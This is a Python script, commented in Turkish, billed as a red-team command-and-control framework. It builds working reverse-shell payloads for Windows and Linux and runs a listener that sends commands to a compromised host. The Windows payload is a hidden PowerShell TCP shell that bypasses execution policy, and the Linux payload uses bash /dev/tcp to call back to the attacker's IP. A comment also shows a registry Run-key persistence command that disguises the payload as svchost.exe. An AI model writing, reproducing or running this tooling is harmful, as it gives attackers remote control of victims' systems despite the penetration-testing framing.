#!/usr/bin/env python3
"""
RedTeam Command & Control (C2) Framework
========================================
Sızma testleri için Payload oluşturucu ve Dinleyici (Listener) bir arada.
"""
import os
import sys
import socket
import threading

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def save_payload(filename, content):
    try:
        with open(filename, 'w') as f:
            f.write(content)
        print(f"[+] Payload oluşturuldu: {os.path.abspath(filename)}")
    except Exception as e:
        print(f"[-] Hata: {e}")

def payload_builder_menu():
    clear_screen()
    print("=== PAYLOAD BUILDER ===")
    lhost = input("[?] LHOST (Saldırgan IP): ").strip()
    lport = input("[?] LPORT (Saldırgan Port): ").strip()

    if not lhost or not lport:
        print("[-] Geçersiz IP veya Port.")
        input("Devam etmek için Enter'a basın...")
        return

    print("\n--- Hedef Sistem ---")
    print("1) Windows (PowerShell)")
    print("2) Linux (Bash)")
    choice = input("\n[>] Seçiminiz: ").strip()

    if choice == '1':
        # EĞİTİM NOTU: Otomatik kalıcılık (Auto-Persistence) mantığı.
        # Gerçek bir malware, çalıştırıldığı an arka planda kendini kopyalar
        # ve Windows Registry'sine "svchost.exe" veya "WinUpdate" gibi isimlerle kayıt eder.
        # Örneğin: reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "WinUpdate" /d "C:\Users\Public\svchost.exe" /f
        # Biz burada sadece bağlantıyı sağlayan temel shell kodunu üretiyoruz.
        payload = f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        save_payload("windows_payload.bat", payload)
    
    elif choice == '2':
        payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        save_payload("linux_payload.sh", payload)
    
    else:
        print("[-] Geçersiz seçim.")
    
    input("\nAna menüye dönmek için Enter'a basın...")

def start_listener():
    clear_screen()
    print("=== REVERSE SHELL LISTENER ===")
    lport = input("[?] Dinlenecek Port (Örn: 4444): ").strip()
    
    if not lport.isdigit():
        print("[-] Geçersiz port numarası.")
        input("Devam etmek için Enter'a basın...")
        return
        
    port = int(lport)
    print(f"\n[*] {port} portu dinleniyor... Bağlantı bekleniyor. (Çıkmak için CTRL+C)")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)
        
        conn, addr = s.accept()
        print(f"\n[+] BAĞLANTI GELDİ! Hedef: {addr[0]}:{addr[1]}")
        print("[*] Shell etkileşimine geçiliyor...\n")
        
        while True:
            cmd = input("")
            if cmd.lower() in ['exit', 'quit']:
                break
                
            if len(cmd) > 0:
                conn.send(str.encode(cmd + "\n"))
                client_response = str(conn.recv(4096), "utf-8", errors="replace")
                print(client_response, end="")
                
    except KeyboardInterrupt:
        print("\n[*] Dinleme iptal edildi.")
    except Exception as e:
        print(f"\n[-] Bağlantı hatası: {e}")
    finally:
        try:
            conn.close()
        except:
            pass
        s.close()
    
    input("\nAna menüye dönmek için Enter'a basın...")

def main_menu():
    while True:
        clear_screen()
        print("=======================================")
        print("   🚀 REDTEAM C2 FRAMEWORK v1.0   ")
        print("=======================================")
        print("1) Payload Builder (Dosya Oluştur)")
        print("2) Listener Başlat (Bağlantı Bekle)")
        print("0) Çıkış")
        
        choice = input("\n[>] Seçiminiz: ").strip()
        
        if choice == '1':
            payload_builder_menu()
        elif choice == '2':
            start_listener()
        elif choice == '0':
            print("[*] Sistem kapatılıyor...")
            sys.exit(0)

if __name__ == "__main__":
    main_menu()
